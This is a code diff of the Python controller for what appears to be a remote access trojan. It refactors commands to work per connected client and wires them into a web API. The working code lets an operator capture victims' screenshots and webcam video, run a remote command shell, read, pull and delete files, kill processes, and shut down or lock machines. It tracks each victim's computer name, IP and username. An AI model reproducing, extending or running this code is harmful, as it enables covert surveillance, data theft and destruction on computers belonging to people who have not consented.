@@ -18,39 +18,30 @@ clientInfo = []
 table = PrettyTable()
 table.field_names = ["ID", "Computer", "IP Address", "Username", "System", "File"]
 
-send = lambda data: client.send(bytes(data, "utf-8"))
-recv = lambda buf: client.recv(buffer)
-
-def sendAll(data):
+def SendAll(connection, data):
     if (isinstance(data, bytes)):
-        client.send(bytes(str(len(data)), "utf-8"))
-        if (tcp_connected()):
-            client.send(data)
+        clients[connection].send(bytes(str(len(data)), "utf-8"))
+        if (tcp_connected(connection)):
+            clients[connection].send(data)
     else:
         data = str(data, "utf-8")
-        send(str(len(data)), "utf-8")
-        if (tcp_connected()):
-            send(data)
+        clients[connection].send(str(len(data)), "utf-8")
+        if (tcp_connected(connection)):
+            clients[connection].send(data)
 
-def recvAll(bufsize):
+def ReceiveAll(connection, bufferSize, verbose=False):
     data = bytes()
 
-    send("success")
-    while (len(data) < int(bufsize)):
-        data += recv(int(bufsize))
+    clients[connection].send(b"success")
+    while (len(data) < int(bufferSize)):
+        data += clients[connection].recv(int(bufferSize))
+        if (verbose):
+            print("Receiving: {:,} / {:,} Bytes\r".format(len(data), int(bufferSize)), end="")
+
     return data
 
-def recvAll_Verbose(bufsize):
-    data = bytes()
-
-    send("success")
-    while (len(data) < int(bufsize)):
-        data += recv(int(bufsize))
-        print("Receiving: {:,} / {:,} Bytes\r".format(len(data), int(bufsize)), end="")
-    return data
-
-def tcp_connected():
-    if (b"success" in client.recv(buffer)):
+def tcp_connected(connection):
+    if (b"success" in clients[connection].recv(buffer)):
         return True
 
 def RemoteConnect():
@@ -120,6 +111,7 @@ def ClientCommands():
     print("(File Commands)                       |\n" + \
           "                                      |")
     print("[-gcd] Get Current Directory          |")
+    print("[-wcl] Get Connected Webcams          |")
     print("[-vwf] View Files                     |")
     print("[-sdf] Send File                      |")
     print("[-rvf] Receive File                   |")
@@ -136,29 +128,29 @@ def VBSMessageBox(connection, message):
 
     elif not (len(message) <= 0):
         clients[connection].send(b"msgbox")
-        if (tcp_connected()):
+        if (tcp_connected(connection)):
             clients[connection].send(bytes(message, "utf-8"))
         
         else: return False
 
-    print(str(recv(buffer), "utf-8") + "\n")
+    print(str(clients[connection].recv(buffer), "utf-8") + "\n")
     return True
 
-def CaptureScreenshot():
-    send("screenshot")
+def CaptureScreenshot(connection):
+    clients[connection].send(b"screenshot")
 
-    if not (str(recv(buffer), "utf-8") == "valid"):
+    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to Capture Screenshot\n")
         return
 
     start = time.time()
     print("\nScreenshot Captured")
     try:
-        fileContent = recvAll_Verbose(recv(buffer))
+        fileContent = ReceiveAll(connection, clients[connection].recv(buffer), True)
         if (fileContent == b"bad_alloc"):
             raise MemoryError("Bad Allocation Error - File May be too Large")
 
-        with open(time.strftime(f"{PC_Name}-%Y-%m-%d-%H%M%S.png"), "wb") as ImageFile:
+        with open(time.strftime(f"{clientInfo[connection]['computer']}-%Y-%m-%d-%H%M%S.png"), "wb") as ImageFile:
             ImageFile.write(fileContent)
 
         end = time.time()
@@ -166,18 +158,31 @@ def CaptureScreenshot():
             "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
             len(fileContent) / 1024, len(fileContent), end - start))
 
-    except MemoryError as e:
-        print(e)
+    except:
+        print("[!] Error Receiving File\n")
 
-    except: print("[!] Error Receiving File\n")
+    finally:
+        return {"image": fileContent, "length": len(fileContent)}
 
-def CaptureWebcam():
-    send("webcam")
+def GetConnectedWebcams(connection):
+    clients[connection].send(b"webcam-list")
+    response = str(clients[connection].recv(buffer), "utf-8")
 
-    devices = str(recv(1024), "utf-8")
+    if (response == "NO_WEBCAMS"):
+        print("<No Webcams Detected>\n")
+        return False
+    else:
+        print(response)
+        return response
+
+def CaptureWebcam(connection, webcamId=None, seconds=None):
+    connection = int(connection)
+    clients[connection].send(b"webcam")
+
+    devices = str(clients[connection].recv(1024), "utf-8")
     if (devices == "NO_WEBCAMS"):
         print("<No Webcams Detected>\n")
-        return
+        return False
 
     cameras = 1
     for device in devices.split("\n"):
@@ -188,36 +193,36 @@ def CaptureWebcam():
         cameras += 1
 
     try:
-        cameraID = input("\nChoose Device: ").strip()
+        cameraID = input("\nChoose Device: ").strip() if webcamId == None else int(webcamId)
         if not int(cameraID) in range(1, cameras):
             print("Unrecognized Webcam ID\n")
             raise ValueError
 
-        send(str(cameraID))
+        clients[connection].send(bytes(str(cameraID), "utf-8"))
 
-        duration = int(input("Capture Duration? (seconds): ").strip())
+        duration = int(input("Capture Duration? (seconds): ").strip()) if seconds == None else int(seconds)
         if (duration < 1 or duration > 30):
             print("Duration Range: 1-30 seconds\n")
             raise ValueError
 
-        send(str(duration * 1000))
+        clients[connection].send(bytes(str(duration * 1000), "utf-8"))
 
     except ValueError:
-        send("0")
-        return
+        clients[connection].send(b"0")
+        return False
 
-    if not (str(recv(buffer), "utf-8") == "valid"):
+    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to Capture Webcam\n")
-        return
+        return False
 
     start = time.time()
     print("\nWebcam Captured")
     try:
-        fileContent = recvAll_Verbose(recv(buffer))
+        fileContent = ReceiveAll(connection, clients[connection].recv(buffer))
         if (fileContent == b"bad_alloc"):
             raise MemoryError("Bad Allocation - File is too Large\n")
 
-        with open(time.strftime(f"{PC_Name}-%Y-%m-%d-%H%M%S.avi"), "wb") as ImageFile:
+        with open(time.strftime(f"{clientInfo[connection]['computer']}-%Y-%m-%d-%H%M%S.avi"), "wb") as ImageFile:
             ImageFile.write(fileContent)
 
         end = time.time()
@@ -225,36 +230,38 @@ def CaptureWebcam():
             "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
             len(fileContent) / 1024, len(fileContent), end - start))
 
-    except MemoryError as e:
-        print(e)
+    except:
+        print("[!] Error Receiving File\n")
 
-    except: print("[!] Error Receiving File\n")
+    finally:
+        return {"image": fileContent, "length": len(fileContent)}
 
-def ChangeWallpaper():
-    localFile = input("\nChoose Local Image File: ").strip()
+def ChangeWallpaper(connection, file=None):
+    localFile = input("\nChoose Local Image File: ").strip() if file == None else file
     if not (os.path.isfile(localFile)):
         print("[!] Unable to find Local File\n")
-        return
+        return -1
 
     elif not (re.search(re.compile("[^\\s]+(.*?)\\.(jpg|jpeg|png)$"), localFile)):
         print("[!] Invalid File Type - Required: (JPEG, JPG, PNG)\n")
-        return
+        return -2
 
-    send("wallpaper")
-    if (tcp_connected()):
-        send(os.path.basename(localFile))
+    clients[connection].send(b"wallpaper")
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(os.path.basename(localFile), "utf-8"))
 
     with open(localFile, "rb") as ImageFile:
         fileContent = ImageFile.read()
 
     print("Sending Image...")
-    sendAll(fileContent)
+    SendAll(connection, fileContent)
 
-    if not (str(recv(buffer), "utf-8") == "received"):
+    if not (str(clients[connection].recv(buffer), "utf-8") == "received"):
         print("[!] Unable to Transfer Image\n")
-        return
+        return -3
 
     print("Wallpaper Changed\n")
+    return True
 
 def SystemInformation(connection):
     print(f"Connection ID:   <{connection}>")
@@ -271,41 +278,49 @@ def SystemInformation(connection):
         "system": clientInfo[connection]['system']
     }
 
-def ViewTasks():
-    send("tasklist")
-    print(str(recvAll(recv(buffer)), "utf-8"))
+def ViewTasks(connection):
+    clients[connection].send(b"tasklist")
+    processes = str(ReceiveAll(connection, clients[connection].recv(buffer)), "utf-8")
 
-def IdleTime():
-    send("idletime")
-    print(str(recv(buffer), "utf-8") + "\n")
+    print(processes)
+    return processes
 
-def StartProcess():
-    process = input("\nRemote File Path: ").strip()
-    send("stprocess")
-    if (tcp_connected()):
-        send(process)
+def IdleTime(connection):
+    clients[connection].send(b"idletime")
+    time = str(clients[connection].recv(buffer), "utf-8") + "\n"
 
-    if not (str(recv(buffer), "utf-8") == "valid"):
+    print(time)
+    return time
+
+def StartProcess(connection, process=None):
+    process = input("\nRemote File Path: ").strip() if process == None else process
+    clients[connection].send(b"stprocess")
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(process, "utf-8"))
+
+    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote File\n")
-        return
+        return False
 
-    print(str(recv(buffer), "utf-8") + "\n")
+    print(str(clients[connection].recv(buffer), "utf-8") + "\n")
+    return True
 
-def KillProcess():
-    process = input("\nTask to Kill: ").strip()
-    send("klprocess")
-    if (tcp_connected()):
-        send(process)
+def KillProcess(connection, process=None):
+    process = input("\nTask to Kill: ").strip() if process == None else process
+    clients[connection].send(b"klprocess")
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(process, "utf-8"))
 
-    print(str(recvAll(recv(buffer)), "utf-8"))
+    print(str(ReceiveAll(connection, clients[connection].recv(buffer)), "utf-8"))
+    return True
 
-def RemoteCMD(IP_Address):
-    send("remote")
-    remoteDirectory = str(recv(buffer), "utf-8")
+def RemoteCMD(connection):
+    clients[connection].send(b"remote")
+    remoteDirectory = str(clients[connection].recv(buffer), "utf-8")
 
     while (True):
         try:
-            command = input(f"\n({IP_Address} ~ {remoteDirectory})> ").strip().lower()
+            command = input(f"\n({clientInfo[connection]['ip']} ~ {remoteDirectory})> ").strip().lower()
             if (command == "exit"):
                 raise KeyboardInterrupt
 
@@ -318,8 +333,8 @@ def RemoteCMD(IP_Address):
                 print("[!] Unable to use this Command")
 
             elif (len(command) > 0):
-                send(command)
-                output = str(recvAll(recv(buffer)), "utf-8")
+                clients[connection].send(bytes(command, "utf-8"))
+                output = str(ReceiveAll(connection, clients[connection].recv(buffer)), "utf-8")
 
                 if (len(output) == 0):
                     print("No Output ~ Command Executed")
@@ -327,41 +342,57 @@ def RemoteCMD(IP_Address):
                     print(output, end="")
 
         except KeyboardInterrupt:
-            send("exit"); print("<Exited Remote CMD>\n")
+            clients[connection].send(b"exit"); print("<Exited Remote CMD>\n")
             break
 
-def WakeComputer():
-    send("wake-computer")
-    if (str(recv(buffer), "utf-8") == "success"):
+def WakeComputer(connection):
+    clients[connection].send(b"wake-computer")
+    if (str(clients[connection].recv(buffer), "utf-8") == "success"):
         print("Computer has been woken\n")
+        return True
+    else:
+        print("Unable to wake Computer\n")
+        return False
 
-def ShutdownComputer(IP_Address):
-    send("shutdown")
-    print(f"Powering Off PC ~ [{IP_Address}]\n")
+def ShutdownComputer(connection):
+    clients[connection].send(b"shutdown")
+    message = f"Powering Off PC ~ [{clientInfo[connection]['ip']}]\n"
 
-def RestartComputer(IP_Address):
-    send("restart")
-    print(f"Restarting PC ~ [{IP_Address}]\n")
+    print(message)
+    return message
 
-def LockComputer(IP_Address):
-    send("lock")
-    print(f"Locking PC ~ [{IP_Address}]\n")
+def RestartComputer(connection):
+    clients[connection].send(b"restart")
+    message = f"Restarting PC ~ [{clientInfo[connection]['ip']}]\n"
 
-def CurrentDirectory():
-    send("directory")
-    print(str(recv(buffer), "utf-8").replace("\\", "/") + "\n")
+    print(message)
+    return message
 
-def ViewFiles():
-    directory = input("\nRemote Folder [-filter]: ").strip()
-    send("files")
-    if (tcp_connected()):
-        send(directory)
+def LockComputer(connection):
+    clients[connection].send(b"lock")
+    message = f"Locking PC ~ [{clientInfo[connection]['ip']}]\n"
+    
+    print(message)
+    return message
 
-    if not (str(recv(buffer), "utf-8") == "valid"):
+def CurrentDirectory(connection):
+    clients[connection].send(b"directory")
+    directory = str(clients[connection].recv(buffer), "utf-8").replace("\\", "/") + "\n"
+
+    print(directory)
+    return directory
+
+def ViewFiles(connection, directory=None):
+    directory = input("\nRemote Folder [-filter]: ").strip() if directory == None else directory
+    clients[connection].send(b"files")
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(directory, "utf-8"))
+
+    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote Directory\n")
-        return
+        return -1
 
-    clientFiles = recvAll(recv(buffer)).split(b"\n")
+    clientFiles = ReceiveAll(connection, clients[connection].recv(buffer)).split(b"\n")
     fileCount = -1
     files = str()
 
@@ -374,18 +405,22 @@ def ViewFiles():
 
     if (fileCount <= 0):
         print("[!] No Results\n")
+        return -2
     else:
-        print("File Count: [{:,}]\nCharacter Count: [{:,}]\n\n{}".format(fileCount, len(files), files), end="")
+        response = "File Count: [{:,}]\nCharacter Count: [{:,}]\n\n{}".format(fileCount, len(files), files)
+        print(response, end="")
+        return response
+        
 
-def SendFile():
+def SendFile(connection):
     localFile = input("\nLocal File Path: ").strip()
     if not (os.path.isfile(localFile)):
         print("[!] Unable to find Local File\n")
         return
         
-    send("receive")
-    if (tcp_connected()):
-        send(os.path.basename(localFile))
+    clients[connection].send(b"receive")
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(os.path.basename(localFile), "utf-8"))
 
     with open(localFile, "rb") as file:
         fileContent = file.read()
@@ -393,9 +428,9 @@ def SendFile():
     start = time.time()
 
     print("Sending File...")
-    sendAll(fileContent)
+    SendAll(connection, fileContent)
 
-    if not (str(recv(buffer), "utf-8") == "received"):
+    if not (str(clients[connection].recv(buffer), "utf-8") == "received"):
         print("[!] Unable to Transfer File\n")
         return
 
@@ -404,19 +439,19 @@ def SendFile():
     print("\nFile Sent: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
         (os.path.basename(localFile)), len(fileContent) / 1024, len(fileContent), end - start))
         
-def ReceiveFile():
+def ReceiveFile(connection):
     filePath = input("\nRemote File Path: ").replace("/", "\\").strip()
-    send("send")
-    if (tcp_connected()):
-        send(filePath)
+    clients[connection].send(b"send")
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(filePath, "utf-8"))
 
-    if not (str(recv(buffer), "utf-8") == "valid"):
+    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote File\n")
         return
         
     start = time.time()
     try:
-        fileContent = recvAll_Verbose(recv(buffer))
+        fileContent = ReceiveAll(connection, clients[connection].recv(buffer))
         fileName = filePath.split("\\")[-1]
         if (fileContent == b"bad_alloc"):
             raise MemoryError("Bad Allocation - File is too Large\n")
@@ -427,28 +462,26 @@ def ReceiveFile():
         end = time.time()
         print("\n\nFile Received: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
             fileName, len(fileContent) / 1024, len(fileContent), end - start))
-
-    except MemoryError as e:
-        print(e)
     
     except: print("[!] Error Receiving File\n")
 
-def ReadFile():
-    filePath = input("\nRemote File Path: ").replace("/", "\\").strip()
-    send("read")
-    if (tcp_connected()):
-        send(filePath)
+def ReadFile(connection, filePath=None):
+    filePath = input("\nRemote File Path: ").replace("/", "\\").strip() if filePath == None else filePath
+    clients[connection].send(b"read")
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(filePath, "utf-8"))
 
-    if not (str(recv(buffer), "utf-8") == "valid"):
+    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote File\n")
-        return
+        return -1
         
     start = time.time()
     try:
-        fileContent = recvAll_Verbose(recv(buffer))
+        fileContent = ReceiveAll(connection, clients[connection].recv(buffer))
         fileName = filePath.split("\\")[-1]
         if (fileContent == b"bad_alloc"):
-            raise MemoryError("Bad Allocation - File is too Large\n")
+            print("Bad Allocation - File is too Large\n")
+            return -2
 
         end = time.time()
         print("\n\nFile Read: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
@@ -461,55 +494,63 @@ def ReadFile():
         with open(fileName, "wb") as RemoteFile:
             RemoteFile.write(fileContent)
 
-    except MemoryError as e:
-        print(e)
+    except:
+        print("[!] Error Reading File\n")
+        return -3
 
-    except: print("[!] Error Reading File\n")
+    finally:
+        return {"file": fileContent, "length": len(fileContent)}
 
-def MoveFile():
-    send("move")
+def MoveFile(connection, filePath=None, remoteDirectory=None):
+    clients[connection].send(b"move")
 
-    filePath = input("\nSelect Remote File: ").strip()
-    remoteDirectory = input("\nNew Remote Directory Location: ").strip()
+    filePath = input("\nSelect Remote File: ").strip() if filePath == None else filePath
+    remoteDirectory = input("\nNew Remote Directory Location: ").strip() if remoteDirectory == None else remoteDirectory
 
-    send(filePath)
-    if (tcp_connected()):
-        send(remoteDirectory)
+    clients[connection].send(bytes(filePath, "utf-8"))
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(remoteDirectory, "utf-8"))
 
-    clientResponse = str(recv(buffer), "utf-8")
+    clientResponse = str(clients[connection].recv(buffer), "utf-8")
     if (clientResponse == "invalid-file"):
         print("[!] Unable to find Remote File\n")
-        return
+        return -1
 
     elif (clientResponse == "invalid-directory"):
         print("[!] Unable to find Remote Directory\n")
-        return
+        return -2
 
-    else: print("File has been Moved\n")
+    else:
+        print("File has been Moved\n")
+        return True
 
-def DeleteFile():
-    filePath = input("\nRemote File Path: ").strip()
-    send("delfile")
-    if (tcp_connected()):
-        send(filePath)
+def DeleteFile(connection, filePath=None):
+    filePath = input("\nRemote File Path: ").strip() if filePath == None else filePath
+    clients[connection].send(b"delfile")
 
-    if not (str(recv(buffer), "utf-8") == "valid"):
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(filePath, "utf-8"))
+
+    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote File\n")
-        return
+        return False
 
-    print(str(recv(buffer), "utf-8") + "\n")
+    print(str(clients[connection].recv(buffer), "utf-8") + "\n")
+    return True
 
-def DeleteDirectory():
-    directory = input("\nRemote Directory: ").strip()
-    send("deldir")
-    if (tcp_connected()):
-        send(directory)
+def DeleteDirectory(connection, directory=None):
+    directory = input("\nRemote Directory: ").strip() if directory == None else directory
+    clients[connection].send(b"deldir")
 
-    if not (str(recv(buffer), "utf-8") == "valid"):
+    if (tcp_connected(connection)):
+        clients[connection].send(bytes(directory, "utf-8"))
+
+    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote Directory\n")
-        return
+        return False
 
-    print(str(recv(buffer), "utf-8") + "\n")
+    print(str(clients[connection].recv(buffer), "utf-8") + "\n")
+    return True
 
 def adjustTable():
     table.clear_rows()
@@ -641,18 +682,12 @@ def SelectConnection():
                 clientInfo.clear()
 
 def RemoteControl(connection):
-    # global current, client, IP_Address, PC_Name, PC_Username, PC_System
     webapi.api.connection = connection
-    client = clients[connection]
-    IP_Address = clientInfo[connection]['ip']
-    PC_Name = clientInfo[connection]['computer']
-    PC_Username = clientInfo[connection]['username']
-    PC_System = clientInfo[connection]['system']
 
-    print(f"Connected: {PC_Name}/{IP_Address} ({clients.index(client)})\n")
+    print(f"Connected: {clientInfo[connection]['computer']}/{clientInfo[connection]['ip']} ({clients.index(clients[connection])})\n")
     while (True):
         try:
-            command = input(f"({PC_Name})> ").lower().strip()
+            command = input(f"({clientInfo[connection]['computer']})> ").lower().strip()
             if (command == "clear" or command == "cls"):
                 os.system("clear" if os.name == "posix" else "cls")
 
@@ -660,91 +695,114 @@ def RemoteControl(connection):
                 ClientCommands()
                 
             elif (command == "-apc"):
-                print(f"Appended Connection ~ [{IP_Address}]")
+                print(f"Appended Connection ~ [{clientInfo[connection]['ip']}]")
                 break
 
             elif (command == "-vmb"):
                 VBSMessageBox(connection, input("\nType Message: ").strip())
 
             elif (command == "-cps"):
-                CaptureScreenshot()
+                CaptureScreenshot(connection)
+
+            elif (command == '-wcl'):
+                GetConnectedWebcams(connection)
 
             elif (command == "-cpw"):
-                CaptureWebcam()
+                CaptureWebcam(connection)
 
             elif (command == "-cwp"):
-                ChangeWallpaper()
+                ChangeWallpaper(connection)
 
             elif (command == "-vsi"):
                 SystemInformation(connection)
 
             elif (command == "-vrt"):
-                ViewTasks()
+                ViewTasks(connection)
 
             elif (command == "-idt"):
-                IdleTime()
+                IdleTime(connection)
 
             elif (command == "-stp"):
-                StartProcess()
+                StartProcess(connection)
 
             elif (command == "-klp"):
-                KillProcess()
+                KillProcess(connection)
 
             elif (command == "-rms"):
-                RemoteCMD(IP_Address)
+               RemoteCMD(connection)
 
             elif (command == "-wkc"):
-                WakeComputer()
+                WakeComputer(connection)
 
             elif (command == "-sdc"):
-                ShutdownComputer(IP_Address)
+                ShutdownComputer(connection)
 
             elif (command == "-rsc"):
-                RestartComputer(IP_Address)
+                RestartComputer(connection)
             
             elif (command == "-lkc"):
-                LockComputer(IP_Address)
+                LockComputer(connection)
 
             elif (command == "-gcd"):
-                CurrentDirectory()
+                CurrentDirectory(connection)
 
             elif (command == "-vwf"):
-                ViewFiles()
+                ViewFiles(connection)
 
             elif (command == "-sdf"):
-                SendFile()
+                SendFile(connection)
                 
             elif (command == "-rvf"):
-                ReceiveFile()
+                ReceiveFile(connection)
 
             elif (command == "-rdf"):
-                ReadFile()
+                ReadFile(connection)
 
             elif (command == "-mvf"):
-                MoveFile()
+                MoveFile(connection)
 
             elif (command == "-dlf"):
-                DeleteFile()
+                DeleteFile(connection)
 
             elif (command == "-dld"):
-                DeleteDirectory()
+                DeleteDirectory(connection)
 
         except KeyboardInterrupt:
             print("\n[Keyboard Interrupted ~ Connection Appended]")
             break
 
         except Exception as e:
-            print(f"\n[-] Lost Connection to ({IP_Address})\n" + f"Error Message: {e}")
-            clients.remove(client)
+            print(f"\n[-] Lost Connection to ({clientInfo[connection]['ip']})\n" + f"Error Message: {e}")
+            clients.remove(clients[connection])
             del(clientInfo[connection])
-            client.close()
+            clients[connection].close()
             break
 
 webapi.api.clients = clients
 webapi.api.clientInfo = clientInfo
 
 webapi.api.VBSMessageBox = VBSMessageBox
+webapi.api.ChangeWallpaper = ChangeWallpaper
+webapi.api.CaptureScreenshot = CaptureScreenshot
+webapi.api.GetConnectedWebcams = GetConnectedWebcams
+webapi.api.CaptureWebcam = CaptureWebcam
 webapi.api.SystemInformation = SystemInformation
+webapi.api.ViewTasks = ViewTasks
+webapi.api.IdleTime = IdleTime
+webapi.api.StartProcess = StartProcess
+webapi.api.KillProcess = KillProcess
+webapi.api.WakeComputer = WakeComputer
+webapi.api.ShutdownComputer = ShutdownComputer
+webapi.api.RestartComputer = RestartComputer
+webapi.api.LockComputer = LockComputer
+webapi.api.CurrentDirectory = CurrentDirectory
+webapi.api.ViewFiles = ViewFiles
+# webapi.api.SendFile = SendFile
+# webapi.api.ReceiveFile = ReceiveFile
+webapi.api.ReadFile = ReadFile
+webapi.api.MoveFile = MoveFile
+webapi.api.DeleteFile = DeleteFile
+webapi.api.DeleteDirectory = DeleteDirectory
 
 webapi.api.clients_lock = threading.Lock()
 
